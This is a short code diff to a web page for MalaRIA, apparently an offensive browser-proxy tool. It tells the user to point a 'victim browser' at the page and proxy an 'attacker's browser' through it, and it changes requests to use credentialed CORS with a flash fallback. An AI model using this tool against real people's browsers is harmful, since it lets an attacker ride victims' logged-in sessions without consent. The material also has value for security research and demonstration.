@@ -52,7 +52,7 @@
     $ ./websockity 8082 localhost:8081 # forward WebSocket connection via TCP to MalaRIA running on 8081    
     </pre>
     <li>Point your victim browser to this page
-    <li>Start WebSocket connection (use websockify port 8082)
+    <li>Press 'start' to open WebSocket connection (use websockify port 8082)
     <li>Set HTTP proxy on attacker's browser to localhost:8080
     <li>Use attacker browser to navigate through victim browser (usual MalaRIA stuff). URLs have to be same domain as connector or have CORS headers.
     </ol>
@@ -64,8 +64,8 @@ var p;
 
 function requestUrl(url, method) {
     log("Requesting " + url);
-    var use_methods = ['cors']; 
-    // USE ['cors', 'flash'] instead to fallback to flash
+    var use_methods = ['cors-withcredentials','flash']; 
+    // USE ['flash'] instead to use flash only, see index.html
     f.postMessage(JSON.stringify([ use_methods, url, method, null ]), '*');
 }
 
@@ -102,7 +102,7 @@ function returnResponseToProxy(event) {
     var response = '';
     var binaryBody = null;
     if (d.result === 'ok') {
-        log("Received success response");
+        log("Received success response from " + d.request.type);
         if (d.response.bytes) {
           binaryBody = new Uint8Array(d.response.bytes.length); // Note:not xhr.responseText
           for (var i  = 0 ; i < d.response.bytes.length; i++) {
@@ -149,7 +149,7 @@ function launchMalariaConnector() {
     p.onerror = function() {
         log("Cannot connect to WebSocket server at " + p.URL);
     };
-    document.getElementById('start').disabled = '';
+    document.getElementById('start').disabled = 'disabled';
     document.getElementById('start').onclick = null;
 }
 
